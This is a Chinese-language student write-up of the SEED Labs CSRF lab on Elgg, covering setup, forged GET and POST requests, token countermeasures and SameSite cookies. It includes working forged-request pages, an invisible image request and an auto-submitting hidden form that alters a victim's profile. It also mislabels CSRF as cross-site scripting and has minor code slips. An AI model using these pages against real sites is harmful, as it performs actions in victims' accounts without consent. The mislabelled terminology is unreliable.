# CSRF原理

跨站脚本攻击

原理

- 同站请求
  - 一个来自example.com的网页向example.com发送请求
- 跨站请求
  - evil.com向example.com发送请求

**假设受害者访问了evil.com，该网页中嵌入了js代码，进行了跨站请求，浏览器在请求发起时附加所有属于example.com的cookies，那么就会造成跨站脚本攻击**

一个get请求示例

```
<html>
    <body>
        <h1>This page forges an HTTP GET request.</h1>

        <img src="http://www.csrflabelgg.com/action/friends/add?friend=59" 
            alt="image" width="1" height="1" />
    </body>
</html>
```

`src`属性指定一个URL `http://www.csrflabelgg.com/action/friends/add?friend=59`，它似乎是带有`friend`参数的HTTP GET请求的URL。如果用户访问了这个页面并且已经登陆到csrflabelgg.com网站，则该 GET 请求会向该网站发送`friend=59`参数的请求

防御：可以在header中增加csrf_token

# lab setup

下载lab文件

```shell
curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip -o Labsetup.zip
```

解压

```shell
unzip Labsetup.zip
```

运行容器

```
dcbuild #docker-compose构建镜像
dcup #运行容器
```

修改hosts文件增加dns映射

```
10.9.0.5 www.seed-server.com
10.9.0.5 www.example32.com
10.9.0.105 www.attacker32.com
```


# Task 1: Observing HTTP Request

由于我们需要伪造 HTTP 请求，因此需要观察合法的http请求是什么样子，因此可以使用HTTP Header Live给Get/Post请求抓包

# Task 2: CSRF Attack using GET Request

> `__elgg_ts`和`__elgg_token`是保护机制，为了简化实验难度，需要被禁用

更改网页源码即可，代码位于容器中`/var/www/addfriend.html`

```javascript
<html>
    <body>
        <h1>This page forges an HTTP GET request.</h1>

        <img src="http://www.csrflabelgg.com/action/friends/add?friend=59" //修改
            alt="image" width="1" height="1" />
    </body>
</html>
```

以Alice的身份登录Elgg，然后点击http://www.attacker32.com/addfriend.html/ ，发现好友已经被添加

# Task 3: CSRF Attack using POST Request

点击edit profile，然后抓包看这个行为导致了什么样的post请求

- acesslevel的值2将字段的访问级别设置为 public，否则其他人无法看到此字段
- guid是用户的身份id，Alice是56

更改容器中`/var/www/editprofile.html`的代码

```javascript
<html>
    <body>
        <h1>This page forges an HTTP POST request</h1>
        <script type="text/javascript">
            function forge_post(){
                var fields;

                fields = "<input type='hidden' name='name' value='Alice'>";
                fields += "<input type='hidden' name='description' value='SAMY is MY HERO'>";
                fields += "<input type='hidden' name='accesslevel[description] value='2'>";
                fields += "<input type='hidden' name='guid' value='56'>";
 
                var p = document.createElement("form");
                p.action = "http://www.seed-server.com/action/profile/edit";
                p.innerHTML = fields;
                p.method = "post";
                document.body.appendChild(p);
                p.submit();
            }

            window.onload = function() {
                forge_post();
            }
        </script>
    </body>
</html>
```

Question 1: The forged HTTP request needs Alice’s user id (guid) to work properly. If Boby targets
Alice specifically, before the attack, he can find ways to get Alice’s user id. Boby does not know
Alice’s Elgg password, so he cannot log into Alice’s account to get the information. Please describe
how Boby can solve this problem.

- f12

Question 2: If Boby would like to launch the attack to anybody who visits his malicious web page.
In this case, he does not know who is visiting the web page beforehand. Can he still launch the CSRF

- 不能


# Task 4: Enabling Elgg’s Countermeasure

elgg防止csrf攻击的安全措施：

- 在页面中放置一个秘密令牌（token），通过检查令牌是否出现在请求中，它们可以判断请求是同一站点请求还是跨站点请求
- elgg在HTTP请求中加入了`__elgg_t`和`__elgg_token`参数，分别是timestamp（时间戳）和【站点秘密值(从数据库检索)、时间戳、用户会话 ID 和随机生成的会话字符串的哈希值】，服务器会验证这两个是否正确
- valid函数验证token和时间戳，seed在这个函数的开头添加了一个返回值从而禁用了验证
- 如果要启用验证只需删除return语句

```java
public function validate(Request $request) {
    return; // Added for SEED Labs (disabling the CSRF countermeasure)
    $token = $request->getParam(’__elgg_token’);
    $ts = $request->getParam(’__elgg_ts’);
    ... (code omitted) ...
}
```

# Task 5: Experimenting with the SameSite Cookie Method

Cookie 的SameSite属性有三个选择:

- Strict
- Lax
- None

值为Strict，则不会跨站请求使用

导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。

| 请求类型  | 示例                                 | 正常情况    | Lax         |
| --------- | ------------------------------------ | ----------- | ----------- |
| 链接      | `<a href="..."></a>`                 | 发送 Cookie | 发送 Cookie |
| 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
| GET 表单  | `<form method="GET" action="...">`   | 发送 Cookie | 发送 Cookie |
| POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
| iframe    | `<iframe src="..."></iframe>`        | 发送 Cookie | 不发送      |
| AJAX      | ` $.get("...") `                     | 发送 Cookie | 不发送      |
| Image     | `<img src="...">`                    | 发送 Cookie | 不发送      |